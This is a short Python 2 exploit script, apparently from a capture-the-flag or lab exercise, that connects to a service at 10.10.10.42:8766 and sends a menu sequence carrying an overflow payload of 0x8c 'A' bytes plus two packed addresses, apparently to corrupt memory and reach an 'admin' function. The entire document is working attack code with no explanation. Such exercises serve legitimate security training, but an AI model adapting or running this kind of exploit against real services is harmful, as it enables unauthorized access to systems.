from socket import *
import thread
import sys
import struct

def recv_thread(f):
    while True:
        sys.stdout.write(f.read(1))

s = create_connection(('10.10.10.42', 8766))
f = s.makefile(bufsize = 0)
thread.start_new_thread(recv_thread, (f,))
f.write("new\n".ljust(256,"\x00"))
payload = "A"*0x8c
payload += struct.pack('<I', 0x0804C010 - 0x90)
payload += struct.pack('<I', 0x0804C014 - 0x90)
f.write((payload+"\n").ljust(256, "\x00"))
f.write("send\n".ljust(256, "\x00"))
f.write("0\n".ljust(256, "\x00"))
f.write("admin\n".ljust(256, "\x00"))
f.flush()
raw_input()
